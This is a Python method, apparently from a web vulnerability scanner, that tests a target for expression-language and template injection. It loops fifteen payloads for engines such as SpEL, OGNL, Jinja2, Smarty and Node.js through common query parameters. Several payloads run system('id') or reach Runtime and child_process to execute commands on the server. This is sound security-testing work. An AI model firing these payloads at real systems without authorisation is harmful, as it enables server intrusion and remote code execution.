    def test_w11_el_injection_all(self):
        """W11 #12 — Expression Language Injection (all variants)."""
        if not self.deep: return
        self._print("[*]", "W11: EL Injection All...", "INFO")
        el_payloads = [
            ("${7*7}", "JSP EL"),
            ("#{7*7}", "SpEL"),
            ("%{7*7}", "OGNL"),
            ("${{7*7}}", "Jinja2"),
            ("{{7*7}}", "Twig"),
            ("<%= 7*7 %>", "ERB"),
            ("{php}system('id');{/php}", "Smarty"),
            ("${T(java.lang.Runtime).getRuntime()}", "Spring SpEL"),
            ("%{T(java.lang.Runtime).getRuntime()}", "OGNL"),
            ("#{T(java.lang.Runtime).getRuntime()}", "SpEL"),
            ("${process.mainModule.require('child_process')}", "Node.js"),
            ("{system('id')}", "Mako"),
            ("{* system('id') *}", "Smarty2"),
            ("<%system('id')%>", "JSP"),
            ("{%import os%}{{os.system('id')}}", "Jinja2"),
        ]
        for param in ["q", "name", "search", "page", "template", "render"]:
            for payload, label in el_payloads:
                r = self._get(self.target, params={param: payload})
                if not r: continue
                txt = r.text or ""
                if "49" in txt and "7*7" not in txt:
                    self._add_vuln(f"W11 EL Injection: {label}",
                                    "CRITICAL", self.target,
                                    f"Expression Language injection ({label}) via {param}",
                                    param=param, label=label, payload=payload)
                    return
                if "uid=" in txt and "gid=" in txt:
                    self._add_vuln(f"W11 EL RCE: {label}",
                                    "CRITICAL", self.target,
                                    f"RCE via {label} on {param}",
                                    param=param, label=label)
